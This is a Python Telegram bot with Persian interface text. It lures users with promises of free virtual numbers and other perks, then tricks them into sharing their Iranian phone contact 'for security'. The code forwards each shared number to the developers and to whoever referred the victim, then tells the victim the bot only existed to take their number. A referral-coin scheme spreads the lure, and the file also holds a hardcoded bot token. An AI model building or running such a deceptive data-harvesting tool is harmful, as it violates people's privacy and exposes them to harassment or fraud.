import os
import json
import telebot
from telebot import types

# ---------- config ----------
TOKEN = '8291587446:AAGpxX3hlm8uQ8kabjaQ3K3XcNb2DSyTt0k'
DEVS = [876004011, 895452516]

bot = telebot.TeleBot(TOKEN)

# ---------- folders ----------
os.makedirs('users', exist_ok=True)
os.makedirs('data', exist_ok=True)

# ---------- helpers ----------
def load_user(user_id):
    path = f'users/{user_id}.json'
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {'coin': 0, 'getting_number': [], 'command': None}

def save_user(user_id, data):
    with open(f'users/{user_id}.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_settings():
    path = 'data/settings.json'
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {'members': []}

def save_settings(settings):
    with open('data/settings.json', 'w', encoding='utf-8') as f:
        json.dump(settings, f, ensure_ascii=False, indent=4)

settings = load_settings()
members = settings.get('members', [])

# ---------- start ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    text = message.text
    ref = text.split()[1] if len(text.split()) > 1 else None

    user_data = load_user(user_id)

    if user_id not in members:
        members.append(user_id)
        save_settings({'members': members})
        save_user(user_id, user_data)

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("دریافت لینک اختصاصی 🎈", callback_data="getlink"),
        types.InlineKeyboardButton("راهنما 👨‍🏫", callback_data="help"),
        types.InlineKeyboardButton("حساب کاربری 🕵‍♂", callback_data="myinfo"),
        types.InlineKeyboardButton("درباره ربات 📚", callback_data="about")
    )

    if ref and str(ref) != str(user_id):
        try:
            ref = int(ref)
            ref_data = load_user(ref)
            ref_data['coin'] = ref_data.get('coin', 0) + 1
            save_user(ref, ref_data)
            bot.send_message(ref, f"#جذب\nکاربر <a href='tg://user?id={user_id}'>{user_id}</a> از لینک شما وارد شد +۱ سکه!", parse_mode='HTML')

            if ref_data['coin'] >= 5:
                share_kb = types.InlineKeyboardMarkup()
                share_kb.add(types.InlineKeyboardButton("دریافت شماره مجازی 📱", callback_data=f"share-{ref}"))
                bot.send_message(user_id, "سلام کاربر محترم 🌸\nبه بهترین ربات همه کاره خوش آمدید 🌹\nکانال ما @my_oj", reply_markup=share_kb)
            else:
                bot.send_message(user_id, "سلام 👋\nبه ربات دریافت شماره دیگران خوش آمدید 🌹\nلینک اختصاصی بگیرید و پخش کنید!", reply_markup=keyboard)
        except:
            bot.send_message(user_id, "سلام 👋\nبه ربات خوش آمدید 🌹", reply_markup=keyboard)
    else:
        bot.send_message(user_id, "سلام 👋\nبه ربات دریافت شماره دیگران خوش آمدید 🌹\nیک گزینه انتخاب کنید:", reply_markup=keyboard)

# ---------- callback ----------
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    user_data = load_user(user_id)
    data = call.data

    if data.startswith('share-'):
        ref = int(data.split('-')[1])
        user_data['command'] = f"share_contact-{ref}"
        save_user(user_id, user_data)
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        kb.add(types.KeyboardButton("ارسال شماره 📞", request_contact=True))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="جهت امنیت لطفا شماره خود را ارسال کنید 💌:", reply_markup=kb)

    elif data == 'getlink':
        username = bot.get_me().username
        link = f"https://t.me/{username}?start={user_id}"
        caption = f"نمیخوام وقتتو بگیرم ☺️\nاین ربات بهترین ربات رایگان تلگرامه 😍\nشماره مجازی بدون زیرمجموعه 🔥\nعکس کارتونی، جستجو فیلم و...\nلینک: {link}"
        if os.path.exists('data/hi000bot.jpg'):
            with open('data/hi000bot.jpg', 'rb') as photo:
                bot.send_photo(user_id, photo, caption=caption)
        bot.send_message(user_id, "✔️ بنر شما ساخته شد!", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت 🔙", callback_data="home")))

    elif data == 'help':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="لینک اختصاصی بگیرید و برای دیگران بفرستید.\nبرای باز شدن گزینه دریافت شماره باید ۵ نفر از لینک شما وارد شوند.", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت 🔙", callback_data="home")))

    elif data == 'myinfo':
        coin = user_data.get('coin', 0)
        numbers = '\n'.join([f"▪️ +{n}" for n in user_data.get('getting_number', [])]) or "هیچ شماره‌ای دریافت نکرده‌اید"
        text = f"💰 تعداد سکه های شما : {coin}\n🧰 لیست شماره های دریافتی :\n{numbers}"
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت 🔙", callback_data="home")))

    elif data == 'about':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🎙Creator : @t000c\n🔈Our Channel : @my_oj", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت 🔙", callback_data="home")))

    elif data == 'home':
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("دریافت لینک اختصاصی 🎈", callback_data="getlink"),
            types.InlineKeyboardButton("راهنما 👨‍🏫", callback_data="help"),
            types.InlineKeyboardButton("حساب کاربری 🕵‍♂", callback_data="myinfo"),
            types.InlineKeyboardButton("درباره ربات 📚", callback_data="about")
        )
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="با موفقیت به منوی اصلی بازگشتیم !", reply_markup=kb)

# ---------- contact ----------
@bot.message_handler(content_types=['contact'])
def contact(message):
    user_id = message.from_user.id
    user_data = load_user(user_id)
    command = user_data.get('command')

    if command and command.startswith('share_contact-'):
        ref = int(command.split('-')[1])
        phone = message.contact.phone_number
        contact_uid = message.contact.user_id

        if contact_uid == user_id and phone.startswith('98'):
            for dev in DEVS:
                bot.forward_message(dev, user_id, message.message_id)
            bot.forward_message(ref, user_id, message.message_id)

            ref_data = load_user(ref)
            ref_data['getting_number'].append(phone)
            ref_data['coin'] = max(ref_data.get('coin', 0) - 5, 0)
            save_user(ref, ref_data)

            user_data['command'] = None
            save_user(user_id, user_data)

            bot.reply_to(message, "🖌دوست عزیز این ربات فقط یک ربات برای دریافت شماره شما بود.", reply_markup=types.ReplyKeyboardRemove())
            bot.send_message(user_id, "درود 👋\nاین ربات فقط یک ربات دریافت شماره بود.\nشماره شما در دست صاحب لینک است!\n/start بزنید برای ادامه.", reply_markup=types.InlineKeyboardMarkup(row_width=2).add(
                types.InlineKeyboardButton("دریافت لینک اختصاصی 🎈", callback_data="getlink"),
                types.InlineKeyboardButton("راهنما 👨‍🏫", callback_data="help"),
                types.InlineKeyboardButton("حساب کاربری 🕵‍♂", callback_data="myinfo"),
                types.InlineKeyboardButton("درباره ربات 📚", callback_data="about")
            ))
        elif not phone.startswith('98'):
            bot.reply_to(message, "🚫 فقط شماره های ایران قادر به استفاده از ربات میباشند.", reply_markup=types.ReplyKeyboardRemove())

# ---------- run ----------
print("بات شروع شد و آنلاینه...")
bot.infinity_polling()